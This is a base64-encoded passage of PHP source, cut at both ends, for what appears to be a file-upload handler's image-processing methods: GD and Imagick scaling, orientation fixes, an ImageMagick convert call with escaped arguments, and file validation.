TsKICAgICAgICAgICAgJG5ld19oZWlnaHQgPSAkaW1nX2hlaWdodCAqICRzY2FsZTsKICAgICAgICAgICAgJGRzdF94ID0gMDsKICAgICAgICAgICAgJGRzdF95ID0gMDsKICAgICAgICAgICAgJG5ld19pbWcgPSBpbWFnZWNyZWF0ZXRydWVjb2xvcigkbmV3X3dpZHRoLCAkbmV3X2hlaWdodCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCgkaW1nX3dpZHRoIC8gJGltZ19oZWlnaHQpID49ICgkbWF4X3dpZHRoIC8gJG1heF9oZWlnaHQpKSB7CiAgICAgICAgICAgICAgICAkbmV3X3dpZHRoID0gJGltZ193aWR0aCAvICgkaW1nX2hlaWdodCAvICRtYXhfaGVpZ2h0KTsKICAgICAgICAgICAgICAgICRuZXdfaGVpZ2h0ID0gJG1heF9oZWlnaHQ7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkbmV3X3dpZHRoID0gJG1heF93aWR0aDsKICAgICAgICAgICAgICAgICRuZXdfaGVpZ2h0ID0gJGltZ19oZWlnaHQgLyAoJGltZ193aWR0aCAvICRtYXhfd2lkdGgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRkc3RfeCA9IDAgLSAoJG5ld193aWR0aCAtICRtYXhfd2lkdGgpIC8gMjsKICAgICAgICAgICAgJGRzdF95ID0gMCAtICgkbmV3X2hlaWdodCAtICRtYXhfaGVpZ2h0KSAvIDI7CiAgICAgICAgICAgICRuZXdfaW1nID0gaW1hZ2VjcmVhdGV0cnVlY29sb3IoJG1heF93aWR0aCwgJG1heF9oZWlnaHQpOwogICAgICAgIH0KICAgICAgICAgICAgICAgIHN3aXRjaCAoJHR5cGUpIHsKICAgICAgICAgICAgY2FzZSAnZ2lmJzoKICAgICAgICAgICAgY2FzZSAncG5nJzoKICAgICAgICAgICAgICAgIGltYWdlY29sb3J0cmFuc3BhcmVudCgkbmV3X2ltZywgaW1hZ2Vjb2xvcmFsbG9jYXRlKCRuZXdfaW1nLCAwLCAwLCAwKSk7CiAgICAgICAgICAgIGNhc2UgJ3BuZyc6CiAgICAgICAgICAgICAgICBpbWFnZWFscGhhYmxlbmRpbmcoJG5ld19pbWcsIGZhbHNlKTsKICAgICAgICAgICAgICAgIGltYWdlc2F2ZWFscGhhKCRuZXdfaW1nLCB0cnVlKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICAkc3VjY2VzcyA9IGltYWdlY29weXJlc2FtcGxlZCgKICAgICAgICAgICAgJG5ld19pbWcsCiAgICAgICAgICAgICRzcmNfaW1nLAogICAgICAgICAgICAkZHN0X3gsCiAgICAgICAgICAgICRkc3RfeSwKICAgICAgICAgICAgMCwKICAgICAgICAgICAgMCwKICAgICAgICAgICAgJG5ld193aWR0aCwKICAgICAgICAgICAgJG5ld19oZWlnaHQsCiAgICAgICAgICAgICRpbWdfd2lkdGgsCiAgICAgICAgICAgICRpbWdfaGVpZ2h0CiAgICAgICAgKSAmJiAkd3JpdGVfZnVuYygkbmV3X2ltZywgJG5ld19maWxlX3BhdGgsICRpbWFnZV9xdWFsaXR5KTsKICAgICAgICAkdGhpcy0+Z2Rfc2V0X2ltYWdlX29iamVjdCgkZmlsZV9wYXRoLCAkbmV3X2ltZyk7CiAgICAgICAgcmV0dXJuICRzdWNjZXNzOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBpbWFnaWNrX2dldF9pbWFnZV9vYmplY3QoJGZpbGVfcGF0aCwgJG5vX2NhY2hlID0gZmFsc2UpIHsKICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPmltYWdlX29iamVjdHNbJGZpbGVfcGF0aF0pIHx8ICRub19jYWNoZSkgewogICAgICAgICAgICAkdGhpcy0+aW1hZ2lja19kZXN0cm95X2ltYWdlX29iamVjdCgkZmlsZV9wYXRoKTsKICAgICAgICAgICAgJGltYWdlID0gbmV3IFxJbWFnaWNrKCk7CiAgICAgICAgICAgIGlmICghZW1wdHkoJHRoaXMtPm9wdGlvbnNbJ2ltYWdpY2tfcmVzb3VyY2VfbGltaXRzJ10pKSB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+b3B0aW9uc1snaW1hZ2lja19yZXNvdXJjZV9saW1pdHMnXSBhcyAkdHlwZSA9PiAkbGltaXQpIHsKICAgICAgICAgICAgICAgICAgICAkaW1hZ2UtPnNldFJlc291cmNlTGltaXQoJHR5cGUsICRsaW1pdCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGltYWdlLT5yZWFkSW1hZ2UoJGZpbGVfcGF0aCk7CiAgICAgICAgICAgICR0aGlzLT5pbWFnZV9vYmplY3RzWyRmaWxlX3BhdGhdID0gJGltYWdlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPmltYWdlX29iamVjdHNbJGZpbGVfcGF0aF07CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGltYWdpY2tfc2V0X2ltYWdlX29iamVjdCgkZmlsZV9wYXRoLCAkaW1hZ2UpIHsKICAgICAgICAkdGhpcy0+aW1hZ2lja19kZXN0cm95X2ltYWdlX29iamVjdCgkZmlsZV9wYXRoKTsKICAgICAgICAkdGhpcy0+aW1hZ2Vfb2JqZWN0c1skZmlsZV9wYXRoXSA9ICRpbWFnZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gaW1hZ2lja19kZXN0cm95X2ltYWdlX29iamVjdCgkZmlsZV9wYXRoKSB7CiAgICAgICAgJGltYWdlID0gKGlzc2V0KCR0aGlzLT5pbWFnZV9vYmplY3RzWyRmaWxlX3BhdGhdKSkgPyAkdGhpcy0+aW1hZ2Vfb2JqZWN0c1skZmlsZV9wYXRoXSA6IG51bGwgOwogICAgICAgIHJldHVybiAkaW1hZ2UgJiYgJGltYWdlLT5kZXN0cm95KCk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGltYWdpY2tfb3JpZW50X2ltYWdlKCRpbWFnZSkgewogICAgICAgICRvcmllbnRhdGlvbiA9ICRpbWFnZS0+Z2V0SW1hZ2VPcmllbnRhdGlvbigpOwogICAgICAgICRiYWNrZ3JvdW5kID0gbmV3IFxJbWFnaWNrUGl4ZWwoJ25vbmUnKTsKICAgICAgICBzd2l0Y2ggKCRvcmllbnRhdGlvbikgewogICAgICAgICAgICBjYXNlIFxpbWFnaWNrOjpPUklFTlRBVElPTl9UT1BSSUdIVDogICAgICAgICAgICAgICAgICRpbWFnZS0+ZmxvcEltYWdlKCk7ICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSBcaW1hZ2ljazo6T1JJRU5UQVRJT05fQk9UVE9NUklHSFQ6ICAgICAgICAgICAgICAgICAkaW1hZ2UtPnJvdGF0ZUltYWdlKCRiYWNrZ3JvdW5kLCAxODApOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgXGltYWdpY2s6Ok9SSUVOVEFUSU9OX0JPVFRPTUxFRlQ6ICAgICAgICAgICAgICAgICAkaW1hZ2UtPmZsaXBJbWFnZSgpOyAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgXGltYWdpY2s6Ok9SSUVOVEFUSU9OX0xFRlRUT1A6ICAgICAgICAgICAgICAgICAkaW1hZ2UtPmZsb3BJbWFnZSgpOyAgICAgICAgICAgICAgICAgJGltYWdlLT5yb3RhdGVJbWFnZSgkYmFja2dyb3VuZCwgMjcwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlIFxpbWFnaWNrOjpPUklFTlRBVElPTl9SSUdIVFRPUDogICAgICAgICAgICAgICAgICRpbWFnZS0+cm90YXRlSW1hZ2UoJGJhY2tncm91bmQsIDkwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlIFxpbWFnaWNrOjpPUklFTlRBVElPTl9SSUdIVEJPVFRPTTogICAgICAgICAgICAgICAgICRpbWFnZS0+ZmxpcEltYWdlKCk7ICAgICAgICAgICAgICAgICAkaW1hZ2UtPnJvdGF0ZUltYWdlKCRiYWNrZ3JvdW5kLCAyNzApOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgXGltYWdpY2s6Ok9SSUVOVEFUSU9OX0xFRlRCT1RUT006ICAgICAgICAgICAgICAgICAkaW1hZ2UtPnJvdGF0ZUltYWdlKCRiYWNrZ3JvdW5kLCAyNzApOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRpbWFnZS0+c2V0SW1hZ2VPcmllbnRhdGlvbihcaW1hZ2ljazo6T1JJRU5UQVRJT05fVE9QTEVGVCk7ICAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGltYWdpY2tfY3JlYXRlX3NjYWxlZF9pbWFnZSgkZmlsZV9uYW1lLCAkdmVyc2lvbiwgJG9wdGlvbnMpIHsKICAgICAgICBsaXN0KCRmaWxlX3BhdGgsICRuZXdfZmlsZV9wYXRoKSA9CiAgICAgICAgICAgICR0aGlzLT5nZXRfc2NhbGVkX2ltYWdlX2ZpbGVfcGF0aHMoJGZpbGVfbmFtZSwgJHZlcnNpb24pOwogICAgICAgICRpbWFnZSA9ICR0aGlzLT5pbWFnaWNrX2dldF9pbWFnZV9vYmplY3QoCiAgICAgICAgICAgICRmaWxlX3BhdGgsCiAgICAgICAgICAgICFlbXB0eSgkb3B0aW9uc1snY3JvcCddKSB8fCAhZW1wdHkoJG9wdGlvbnNbJ25vX2NhY2hlJ10pCiAgICAgICAgKTsKICAgICAgICBpZiAoJGltYWdlLT5nZXRJbWFnZUZvcm1hdCgpID09PSAnR0lGJykgewogICAgICAgICAgICAgICAgICAgICAgICAkaW1hZ2VzID0gJGltYWdlLT5jb2FsZXNjZUltYWdlcygpOwogICAgICAgICAgICBmb3JlYWNoICgkaW1hZ2VzIGFzICRmcmFtZSkgewogICAgICAgICAgICAgICAgJGltYWdlID0gJGZyYW1lOwogICAgICAgICAgICAgICAgJHRoaXMtPmltYWdpY2tfc2V0X2ltYWdlX29iamVjdCgkZmlsZV9uYW1lLCAkaW1hZ2UpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJGltYWdlX29yaWVudGVkID0gZmFsc2U7CiAgICAgICAgaWYgKCFlbXB0eSgkb3B0aW9uc1snYXV0b19vcmllbnQnXSkpIHsKICAgICAgICAgICAgJGltYWdlX29yaWVudGVkID0gJHRoaXMtPmltYWdpY2tfb3JpZW50X2ltYWdlKCRpbWFnZSk7CiAgICAgICAgfQogICAgICAgICRuZXdfd2lkdGggPSAkbWF4X3dpZHRoID0gJGltZ193aWR0aCA9ICRpbWFnZS0+Z2V0SW1hZ2VXaWR0aCgpOwogICAgICAgICRuZXdfaGVpZ2h0ID0gJG1heF9oZWlnaHQgPSAkaW1nX2hlaWdodCA9ICRpbWFnZS0+Z2V0SW1hZ2VIZWlnaHQoKTsKICAgICAgICBpZiAoIWVtcHR5KCRvcHRpb25zWydtYXhfd2lkdGgnXSkpIHsKICAgICAgICAgICAgJG5ld193aWR0aCA9ICRtYXhfd2lkdGggPSAkb3B0aW9uc1snbWF4X3dpZHRoJ107CiAgICAgICAgfQogICAgICAgIGlmICghZW1wdHkoJG9wdGlvbnNbJ21heF9oZWlnaHQnXSkpIHsKICAgICAgICAgICAgJG5ld19oZWlnaHQgPSAkbWF4X2hlaWdodCA9ICRvcHRpb25zWydtYXhfaGVpZ2h0J107CiAgICAgICAgfQogICAgICAgIGlmICghKCRpbWFnZV9vcmllbnRlZCB8fCAkbWF4X3dpZHRoIDwgJGltZ193aWR0aCB8fCAkbWF4X2hlaWdodCA8ICRpbWdfaGVpZ2h0KSkgewogICAgICAgICAgICBpZiAoJGZpbGVfcGF0aCAhPT0gJG5ld19maWxlX3BhdGgpIHsKICAgICAgICAgICAgICAgIHJldHVybiBjb3B5KCRmaWxlX3BhdGgsICRuZXdfZmlsZV9wYXRoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgJGNyb3AgPSAhZW1wdHkoJG9wdGlvbnNbJ2Nyb3AnXSk7CiAgICAgICAgaWYgKCRjcm9wKSB7CiAgICAgICAgICAgICR4ID0gMDsKICAgICAgICAgICAgJHkgPSAwOwogICAgICAgICAgICBpZiAoKCRpbWdfd2lkdGggLyAkaW1nX2hlaWdodCkgPj0gKCRtYXhfd2lkdGggLyAkbWF4X2hlaWdodCkpIHsKICAgICAgICAgICAgICAgICRuZXdfd2lkdGggPSAwOyAgICAgICAgICAgICAgICAgJHggPSAoJGltZ193aWR0aCAvICgkaW1nX2hlaWdodCAvICRtYXhfaGVpZ2h0KSAtICRtYXhfd2lkdGgpIC8gMjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRuZXdfaGVpZ2h0ID0gMDsgICAgICAgICAgICAgICAgICR5ID0gKCRpbWdfaGVpZ2h0IC8gKCRpbWdfd2lkdGggLyAkbWF4X3dpZHRoKSAtICRtYXhfaGVpZ2h0KSAvIDI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHN1Y2Nlc3MgPSAkaW1hZ2UtPnJlc2l6ZUltYWdlKAogICAgICAgICAgICAkbmV3X3dpZHRoLAogICAgICAgICAgICAkbmV3X2hlaWdodCwKICAgICAgICAgICAgaXNzZXQoJG9wdGlvbnNbJ2ZpbHRlciddKSA/ICRvcHRpb25zWydmaWx0ZXInXSA6IFxpbWFnaWNrOjpGSUxURVJfTEFOQ1pPUywKICAgICAgICAgICAgaXNzZXQoJG9wdGlvbnNbJ2JsdXInXSkgPyAkb3B0aW9uc1snYmx1ciddIDogMSwKICAgICAgICAgICAgJG5ld193aWR0aCAmJiAkbmV3X2hlaWdodCAgICAgICAgICk7CiAgICAgICAgaWYgKCRzdWNjZXNzICYmICRjcm9wKSB7CiAgICAgICAgICAgICRzdWNjZXNzID0gJGltYWdlLT5jcm9wSW1hZ2UoCiAgICAgICAgICAgICAgICAkbWF4X3dpZHRoLAogICAgICAgICAgICAgICAgJG1heF9oZWlnaHQsCiAgICAgICAgICAgICAgICAkeCwKICAgICAgICAgICAgICAgICR5CiAgICAgICAgICAgICk7CiAgICAgICAgICAgIGlmICgkc3VjY2VzcykgewogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkaW1hZ2UtPnNldEltYWdlUGFnZSgkbWF4X3dpZHRoLCAkbWF4X2hlaWdodCwgMCwgMCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHR5cGUgPSBzdHJ0b2xvd2VyKHN1YnN0cihzdHJyY2hyKCRmaWxlX25hbWUsICcuJyksIDEpKTsKICAgICAgICBzd2l0Y2ggKCR0eXBlKSB7CiAgICAgICAgICAgIGNhc2UgJ2pwZyc6CiAgICAgICAgICAgIGNhc2UgJ2pwZWcnOgogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkb3B0aW9uc1snanBlZ19xdWFsaXR5J10pKSB7CiAgICAgICAgICAgICAgICAgICAgJGltYWdlLT5zZXRJbWFnZUNvbXByZXNzaW9uKFxpbWFnaWNrOjpDT01QUkVTU0lPTl9KUEVHKTsKICAgICAgICAgICAgICAgICAgICAkaW1hZ2UtPnNldEltYWdlQ29tcHJlc3Npb25RdWFsaXR5KCRvcHRpb25zWydqcGVnX3F1YWxpdHknXSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgaWYgKCFlbXB0eSgkb3B0aW9uc1snc3RyaXAnXSkpIHsKICAgICAgICAgICAgJGltYWdlLT5zdHJpcEltYWdlKCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkc3VjY2VzcyAmJiAkaW1hZ2UtPndyaXRlSW1hZ2UoJG5ld19maWxlX3BhdGgpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBpbWFnZW1hZ2lja19jcmVhdGVfc2NhbGVkX2ltYWdlKCRmaWxlX25hbWUsICR2ZXJzaW9uLCAkb3B0aW9ucykgewogICAgICAgIGxpc3QoJGZpbGVfcGF0aCwgJG5ld19maWxlX3BhdGgpID0KICAgICAgICAgICAgJHRoaXMtPmdldF9zY2FsZWRfaW1hZ2VfZmlsZV9wYXRocygkZmlsZV9uYW1lLCAkdmVyc2lvbik7CiAgICAgICAgJHJlc2l6ZSA9IEAkb3B0aW9uc1snbWF4X3dpZHRoJ10KICAgICAgICAgICAgLihlbXB0eSgkb3B0aW9uc1snbWF4X2hlaWdodCddKSA/ICcnIDogJ1gnLiRvcHRpb25zWydtYXhfaGVpZ2h0J10pOwogICAgICAgIGlmICghJHJlc2l6ZSAmJiBlbXB0eSgkb3B0aW9uc1snYXV0b19vcmllbnQnXSkpIHsKICAgICAgICAgICAgaWYgKCRmaWxlX3BhdGggIT09ICRuZXdfZmlsZV9wYXRoKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gY29weSgkZmlsZV9wYXRoLCAkbmV3X2ZpbGVfcGF0aCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgICRjbWQgPSAkdGhpcy0+b3B0aW9uc1snY29udmVydF9iaW4nXTsKICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5vcHRpb25zWydjb252ZXJ0X3BhcmFtcyddKSkgewogICAgICAgICAgICAkY21kIC49ICcgJy4kdGhpcy0+b3B0aW9uc1snY29udmVydF9wYXJhbXMnXTsKICAgICAgICB9CiAgICAgICAgJGNtZCAuPSAnICcuZXNjYXBlc2hlbGxhcmcoJGZpbGVfcGF0aCk7CiAgICAgICAgaWYgKCFlbXB0eSgkb3B0aW9uc1snYXV0b19vcmllbnQnXSkpIHsKICAgICAgICAgICAgJGNtZCAuPSAnIC1hdXRvLW9yaWVudCc7CiAgICAgICAgfQogICAgICAgIGlmICgkcmVzaXplKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRjbWQgLj0gJyAtY29hbGVzY2UnOwogICAgICAgICAgICBpZiAoZW1wdHkoJG9wdGlvbnNbJ2Nyb3AnXSkpIHsKICAgICAgICAgICAgICAgICRjbWQgLj0gJyAtcmVzaXplICcuZXNjYXBlc2hlbGxhcmcoJHJlc2l6ZS4nPicpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJGNtZCAuPSAnIC1yZXNpemUgJy5lc2NhcGVzaGVsbGFyZygkcmVzaXplLideJyk7CiAgICAgICAgICAgICAgICAkY21kIC49ICcgLWdyYXZpdHkgY2VudGVyJzsKICAgICAgICAgICAgICAgICRjbWQgLj0gJyAtY3JvcCAnLmVzY2FwZXNoZWxsYXJnKCRyZXNpemUuJyswKzAnKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkY21kIC49ICcgK3JlcGFnZSc7CiAgICAgICAgfQogICAgICAgIGlmICghZW1wdHkoJG9wdGlvbnNbJ2NvbnZlcnRfcGFyYW1zJ10pKSB7CiAgICAgICAgICAgICRjbWQgLj0gJyAnLiRvcHRpb25zWydjb252ZXJ0X3BhcmFtcyddOwogICAgICAgIH0KICAgICAgICAkY21kIC49ICcgJy5lc2NhcGVzaGVsbGFyZygkbmV3X2ZpbGVfcGF0aCk7CiAgICAgICAgZXhlYygkY21kLCAkb3V0cHV0LCAkZXJyb3IpOwogICAgICAgIGlmICgkZXJyb3IpIHsKICAgICAgICAgICAgZXJyb3JfbG9nKGltcGxvZGUoJ1xuJywgJG91dHB1dCkpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfaW1hZ2Vfc2l6ZSgkZmlsZV9wYXRoKSB7CiAgICAgICAgaWYgKCR0aGlzLT5vcHRpb25zWydpbWFnZV9saWJyYXJ5J10pIHsKICAgICAgICAgICAgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ2ltYWdpY2snKSkgewogICAgICAgICAgICAgICAgJGltYWdlID0gbmV3IFxJbWFnaWNrKCk7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmIChAJGltYWdlLT5waW5nSW1hZ2UoJGZpbGVfcGF0aCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpbWVuc2lvbnMgPSBhcnJheSgkaW1hZ2UtPmdldEltYWdlV2lkdGgoKSwgJGltYWdlLT5nZXRJbWFnZUhlaWdodCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlLT5kZXN0cm95KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkZGltZW5zaW9uczsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoXEV4Y2VwdGlvbiAkZSkgewogICAgICAgICAgICAgICAgICAgIGVycm9yX2xvZygkZS0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJHRoaXMtPm9wdGlvbnNbJ2ltYWdlX2xpYnJhcnknXSA9PT0gMikgewogICAgICAgICAgICAgICAgJGNtZCA9ICR0aGlzLT5vcHRpb25zWydpZGVudGlmeV9iaW4nXTsKICAgICAgICAgICAgICAgICRjbWQgLj0gJyAtcGluZyAnLmVzY2FwZXNoZWxsYXJnKCRmaWxlX3BhdGgpOwogICAgICAgICAgICAgICAgZXhlYygkY21kLCAkb3V0cHV0LCAkZXJyb3IpOwogICAgICAgICAgICAgICAgaWYgKCEkZXJyb3IgJiYgIWVtcHR5KCRvdXRwdXQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW5mb3MgPSBwcmVnX3NwbGl0KCcvXHMrLycsIHN1YnN0cigkb3V0cHV0WzBdLCBzdHJsZW4oJGZpbGVfcGF0aCkpKTsKICAgICAgICAgICAgICAgICAgICAkZGltZW5zaW9ucyA9IHByZWdfc3BsaXQoJy94LycsICRpbmZvc1syXSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICRkaW1lbnNpb25zOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCdnZXRpbWFnZXNpemUnKSkgewogICAgICAgICAgICBlcnJvcl9sb2coJ0Z1bmN0aW9uIG5vdCBmb3VuZDogZ2V0aW1hZ2VzaXplJyk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIEBnZXRpbWFnZXNpemUoJGZpbGVfcGF0aCk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGNyZWF0ZV9zY2FsZWRfaW1hZ2UoJGZpbGVfbmFtZSwgJHZlcnNpb24sICRvcHRpb25zKSB7CiAgICAgICAgaWYgKCR0aGlzLT5vcHRpb25zWydpbWFnZV9saWJyYXJ5J10gPT09IDIpIHsKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5pbWFnZW1hZ2lja19jcmVhdGVfc2NhbGVkX2ltYWdlKCRmaWxlX25hbWUsICR2ZXJzaW9uLCAkb3B0aW9ucyk7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+b3B0aW9uc1snaW1hZ2VfbGlicmFyeSddICYmIGV4dGVuc2lvbl9sb2FkZWQoJ2ltYWdpY2snKSkgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmltYWdpY2tfY3JlYXRlX3NjYWxlZF9pbWFnZSgkZmlsZV9uYW1lLCAkdmVyc2lvbiwgJG9wdGlvbnMpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPmdkX2NyZWF0ZV9zY2FsZWRfaW1hZ2UoJGZpbGVfbmFtZSwgJHZlcnNpb24sICRvcHRpb25zKTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZGVzdHJveV9pbWFnZV9vYmplY3QoJGZpbGVfcGF0aCkgewogICAgICAgIGlmICgkdGhpcy0+b3B0aW9uc1snaW1hZ2VfbGlicmFyeSddICYmIGV4dGVuc2lvbl9sb2FkZWQoJ2ltYWdpY2snKSkgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmltYWdpY2tfZGVzdHJveV9pbWFnZV9vYmplY3QoJGZpbGVfcGF0aCk7CiAgICAgICAgfQogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBpc192YWxpZF9pbWFnZV9maWxlKCRmaWxlX3BhdGgpIHsKICAgICAgICBpZiAoIXByZWdfbWF0Y2goJHRoaXMtPm9wdGlvbnNbJ2ltYWdlX2ZpbGVfdHlwZXMnXSwgJGZpbGVfcGF0aCkpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdleGlmX2ltYWdldHlwZScpKSB7CiAgICAgICAgICAgIHJldHVybiBAZXhpZl9pbWFnZXR5cGUoJGZpbGVfcGF0aCk7CiAgICAgICAgfQogICAgICAgICRpbWFnZV9pbmZvID0gJHRoaXMtPmdldF9pbWFnZV9zaXplKCRmaWxlX3BhdGgpOwogICAgICAgIHJldHVybiAkaW1hZ2VfaW5mbyAmJiAkaW1hZ2VfaW5mb1swXSAmJiAkaW1hZ2VfaW5mb1sxXTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gaGFuZGxlX2ltYWdlX2ZpbGUoJGZpbGVfcGF0aCwgJGZpbGUpIHsKICAgICAgICAkZmFpbGVkX3ZlcnNpb25zID0gYXJyYXkoKTsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+b3B0aW9uc1snaW1hZ2VfdmVyc2lvbnMnXSBhcyAkdmVyc2lvbiA9PiAkb3B0aW9ucykgewogICAgICAgICAgICBpZiAoJHRoaXMtPmNyZWF0ZV9zY2FsZWRfaW1hZ2UoJGZpbGUtPm5hbWUsICR2ZXJzaW9uLCAkb3B0aW9ucykpIHsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHZlcnNpb24pKSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGUtPnskdmVyc2lvbi4nVXJsJ30gPSAkdGhpcy0+Z2V0X2Rvd25sb2FkX3VybCgKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGUtPm5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICR2ZXJzaW9uCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGUtPnNpemUgPSAkdGhpcy0+Z2V0X2ZpbGVfc2l6ZSgkZmlsZV9wYXRoLCB0cnVlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRmYWlsZWRfdmVyc2lvbnNbXSA9ICR2ZXJzaW9uID8gJHZlcnNpb24gOiAnb3JpZ2luYWwnOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChjb3VudCgkZmFpbGVkX3ZlcnNpb25zKSkgewogICAgICAgICAgICAkZmlsZS0+ZXJyb3IgPSAkdGhpcy0+Z2V0X2Vycm9yX21lc3NhZ2UoJ2ltYWdlX3Jlc2l6ZScpCiAgICAgICAgICAgICAgICAgICAgLicgKCcuaW1wbG9kZSgkZmFpbGVkX3ZlcnNpb25zLCAnLCAnKS4nKSc7CiAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPmRlc3Ryb3lfaW1hZ2Vfb2JqZWN0KCRmaWxlX3BhdGgpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBoYW5kbGVfZmlsZV91cGxvYWQoJHVwbG9hZGVkX2ZpbGUsICRuYW1lLCAkc2l6ZSwgJHR5cGUsICRlcnJvciwKICAgICAgICAgICAgJGluZGV4ID0gbnVsbCwgJGNvbnRlbnRfcmFuZ2UgPSBudWxsKSB7CiAgICAgICAgJGZpbGUgPSBuZXcgXHN0ZENsYXNzKCk7CiAgICAgICAgJGZpbGUtPm5hbWUgPSAkdGhpcy0+Z2V0X2ZpbGVfbmFtZSgkdXBsb2FkZWRfZmlsZSwgJG5hbWUsICRzaXplLCAkdHlwZSwgJGVycm9yLAogICAgICAgICAgICAkaW5kZXgsICRjb250ZW50X3JhbmdlKTsKICAgICAgICAkZmlsZS0+c2l6ZSA9ICR0aGlzLT5maXhfaW50ZWdlcl9vdmVyZmxvdygoaW50KSRzaXplKTsKICAgICAgICAkZmlsZS0+dHlwZSA9ICR0eXBlOwogICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGUoJHVwbG9hZGVkX2ZpbGUsICRmaWxlLCAkZXJyb3IsICRpbmRleCkpIHsKICAgICAgICAgICAgJHRoaXMtPmhhbmRsZV9mb3JtX2RhdGEoJGZpbGUsICRpbmRleCk7CiAgICAgICAgICAgICR1cGxvYWRfZGlyID0g